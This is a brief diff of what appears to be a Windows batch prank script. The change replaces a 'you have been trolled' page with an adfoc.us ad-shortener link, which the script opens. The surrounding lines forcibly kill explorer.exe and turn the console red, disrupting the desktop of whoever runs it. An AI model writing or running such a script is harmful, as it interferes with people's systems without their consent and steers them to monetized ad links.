@@ -4,7 +4,7 @@ cd ..
 cd ..
 cd ..
 tree
-start https://youhavebeentrolled.webnode.cz/
+start http://adfoc.us/859243103683755
 taskkill /f /im explorer.exe
 color 4
 cd ..
